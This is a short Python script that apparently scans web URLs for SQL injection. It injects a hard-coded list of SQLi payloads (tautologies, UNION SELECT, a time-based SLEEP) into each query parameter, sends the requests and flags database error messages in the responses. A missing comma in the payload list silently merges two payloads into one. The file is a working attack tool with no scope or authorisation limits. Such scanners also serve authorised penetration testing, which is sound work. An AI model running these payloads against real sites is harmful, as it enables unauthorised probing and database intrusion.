import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

# Basic SQL injection payloads
sqli_payloads = [
    "' OR '1'='1",
    "' OR 1=1 --",
    "\" OR 1=1 --",
    "' UNION SELECT NULL, version() --",
    "' AND SLEEP(5) --"
    "' OR 1=1#",
    "' OR 1=1--",
    "' OR 'x'='x",
    "1' AND 1=1 --",
    "' OR EXISTS(SELECT * FROM users) --",
    "' UNION SELECT NULL,NULL,NULL,NULL --"

]

# Common error keywords in SQL responses
sql_errors = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark after the character string",
    "quoted string not properly terminated",
    "sql syntax error"
]

def inject_sqli_payloads(url):
    parsed = urlparse(url)
    query_params = parse_qs(parsed.query)

    if not query_params:
        return None  # No parameters to test

    vulnerable = []

    for param in query_params:
        for payload in sqli_payloads:
            test_params = query_params.copy()
            test_params[param] = payload

            new_query = urlencode(test_params, doseq=True)
            test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment))

            try:
                response = requests.get(test_url, timeout=5)
                lower_resp = response.text.lower()
                if any(error in lower_resp for error in sql_errors):
                    print(f"[!] Possible SQLi found in: {test_url}")
                    vulnerable.append(test_url)
            except Exception as e:
                print(f"[!] Error testing {test_url}: {e}")

    return vulnerable
